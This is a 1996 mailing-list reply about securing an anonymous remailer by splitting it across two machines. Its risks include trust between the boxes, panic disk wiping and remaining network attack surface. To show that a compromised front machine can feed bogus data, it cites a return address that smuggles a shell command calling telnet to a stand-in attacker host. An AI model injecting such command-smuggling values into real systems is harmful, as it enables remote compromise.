@@ -1,0 +1,73 @@
+From: Adam Shostack <adam@lighthouse.homeport.org>
+Date: Thu, 14 Mar 1996 13:43:25 -0500
+To: cp@proust.suba.com (Alex Strasheim)
+Subject: Re: Remailer passphrases
+In-Reply-To: <199603131713.LAA00824@proust.suba.com>
+Message-ID: <199603140450.XAA12195@homeport.org>
+MIME-Version: 1.0
+Content-Type: text
+
+
+Alex Strasheim wrote:
+
+| If we ignore the obvious problem (ie., no one is going to put much effort
+| or expense into running a free remailer), wouldn't splitting the remailer
+| across two machines help fix the security problem? 
+
+	This is a long standing debate in the security community.
+Some folks like multiple box security.  Others point out that using
+two boxes means both need to be well secured, and you have twice as
+many places to make mistakes.
+
+| Suppose one unix box accepts the mail and puts it a queue directory.  Then
+| a second box periodically grabs files from the first box's queue with ssh
+| (the second box initiates the connection), processes them, and then passes
+| them out to the smtp server on the first box.  The second box doesn't
+| accept incoming connections on any port except for the ssh port so there
+| are no sendmails or httpds to hack.
+
+	Lets say the boxes are called workstation and blackbox.  If I
+break into workstation, I can provide bogus files for blackbox.  Since
+blackbox extends some trust to workstation, it might not be expecting
+to see a message with a return address of "`|telnet evil.fbi.gov`".
+
+	I'd argue that setting up a simple mailer which uses
+workstation as a relay host gives you as much security, and lessens
+your dependance on workstation, which we expect will be comprimised.
+(Of course we expect ws to be comprimised.  Why else are we setting up
+bb as a seperate machine?)
+
+| The remailer files could be running on a cfs drive (with nfs/cfs only
+| accepting connects from localhost), and you could disable getty so that it
+| would be hard to physically grab the machine and read the contents of the
+| disk.  If you had enough ram you wouldn't need a swap file, so there'd be
+| nothing there for someone who grabbed the machine.  If you set the machine
+| up while it's plugged into a small lan that's not connected to the net no
+| one could come in and hide something before you had secured everything. 
+
+	Turning of getty and removing the swap file strike me as a bit
+extreme.  A panic login system, otoh, that accepts a bad password and
+wipes the disk, might not be a bad idea.  (Of course, if this becomes
+popular, the bad guys will just rip out your disk and read it on
+another machine.)
+
+| I know an attacker could interrupt service, and I'd guess that a skillful
+| attacker could probably find a way to grab the cfs and remailer
+| passphrases if he could grab the machine and the control the site
+| physically (to work on it while it's running) for awhile, but how would an
+| attacker come in over the net and hack the remailer box?  
+
+	Be awful tough if it only listens to ssh & smtp.  Are you sure
+your kernel doesn't do anything bogus with ICMP?  Data overflows in
+ssh or smap?  DNS, syslogd, tty overloads?
+
+Adam
+
+-- 
+"It is seldom that liberty of any kind is lost all at once."
+					               -Hume
+
+
+
+
+
